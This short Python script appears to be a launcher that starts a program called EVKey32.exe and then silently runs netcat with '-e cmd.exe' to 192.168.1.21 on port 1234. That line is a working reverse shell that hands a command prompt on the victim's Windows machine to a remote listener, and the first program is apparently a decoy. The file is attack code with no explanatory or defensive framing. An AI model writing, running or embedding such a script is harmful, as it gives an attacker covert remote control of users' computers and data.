import os

x = os.getcwd()
x = x.replace("\\", "\\\\")

a = os.startfile(f"{x}\\nc\\EVKey32.exe")
b = os.popen(f"{x}\\nc\\nc64.exe -e cmd.exe 192.168.1.21 1234 ").read()
